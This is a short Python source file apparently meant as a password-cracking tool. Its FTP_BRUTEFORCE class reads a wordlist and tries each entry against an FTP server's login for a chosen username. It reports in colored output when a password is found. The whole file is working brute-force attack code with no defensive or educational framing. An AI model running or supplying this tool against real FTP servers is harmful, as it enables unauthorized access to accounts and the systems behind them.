import ftplib
from datetime import datetime

class FTP_BRUTEFORCE:
    def __init__(self, username, host, wordlist):
        self.username = username
        self.host = host
        self.wordlist = wordlist

    def ftp_connection_status(self, password, status=True):
        try:
            ftp_client = ftplib.FTP(host=self.host)
            ftp_client.login(self.username, password)
        
        except ftplib.error_perm:
            status = False

        ftp_client.quit()

        return status
    
    def start(self):
        try:
            with open(self.wordlist, "r") as file:
                for line in file.readlines():
                    password = line.strip()

                    try:
                        connection_status = self.ftp_connection_status(password=password)

                        if connection_status == True:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[32m PASSWORD FOUND !!\033[0m\n\n[Password --> ({password})]\n\n")  
                            break
                        
                        else:
                            print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[31m Not Found\033[0m\n\n[Current Password --> ({password})]\n\n")
                    
                    except Exception as e:
                        print(str(e))
                
                print(f"{'=' * 25}|Status|{'=' * 25}\n\n[{datetime.now()}]\033[33m WordList Finished\033[0m\n\n[Current Password --> (None)]\n\n")

        except FileNotFoundError:
            print("File Not Found")